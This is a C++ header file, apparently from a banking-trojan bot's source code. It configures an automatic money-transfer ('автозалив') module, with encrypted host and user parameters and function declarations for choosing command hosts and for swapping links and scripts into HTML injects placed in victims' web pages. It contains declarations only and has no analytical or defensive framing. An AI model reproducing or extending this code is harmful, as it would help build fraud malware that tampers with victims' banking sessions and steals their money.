//---------------------------------------------------------------------------
//  Модуль хранения настроек системы зборки автозалива
//
//  версия 1.0
//  дата: март 2012
//
//
//  ВАЖНО!
//
//  Для использования отдельных ссылок системы AZ заголовочный файл
//  должен быть включён в модульный файл проекта Modules.h, в противном
//  случае будут использоваться основные настройки бота
//---------------------------------------------------------------------------



#ifndef AzConfigH
#define AzConfigH
//---------------------------------------------------------------------------

#include "GetApi.h"
#include "Strings.h"
#include "Strings.h"
#include "BotConfig.h"



#define AZCONFIG_PARAM_SIZE_HOSTS       256
#define AZCONFIG_PARAM_SIZE_SCRIPTHOSTS 256
#define AZCONFIG_PARAM_SIZE_AZUSER      9


#define AZCONFIG_PARAM_NAME_HOSTS       "__AZ_HOSTS__\0"
#define AZCONFIG_PARAM_NAME_SCRIPTHOSTS "__AZ_SCRIPTS_HOSTS__\0"
#define AZCONFIG_PARAM_NAME_AZUSER      "_AZ_USER"

#define AZCONFIG_PARAM_ENCRYPTED_HOSTS        true
#define AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS  true
#define AZCONFIG_PARAM_ENCRYPTED_AZUSER       true





//---------------------------------------------------
//  GetAzUser - Функция возвращает имя пользователя
//  для систем автозалива
//---------------------------------------------------
string GetAzUser();


//----------------------------------------------------
// GetAzHost - Функция возвращает первый рабочий хост
// из массива хостов системы AZ
//----------------------------------------------------
string GetAzHost();

//----------------------------------------------------
//  GetAzURL - Функция возвращает полный адрес на
//   основе Хоста системы и переданного пути
//----------------------------------------------------
string GetAzURL(const char*  Path);



//----------------------------------------------------
//  AzInizializeHTMLInjects  - Функция инициализирует
//  систему подмены ссылок в HTML инжектах
//----------------------------------------------------
void AzInizializeHTMLInjects();


//----------------------------------------------------
// AzCheckScriptHosts - Функция запускает проверку
// хостов вшиваемых в HTML инжекты
//----------------------------------------------------
void AzCheckScriptHosts();


//----------------------------------------------------
// AzGetScriptHost - Функция возвращает  рабочий хост
// для вшития в HTML инжекты
//----------------------------------------------------
string AzGetScriptHost();



//---------------------------------------------------------------------------
#endif
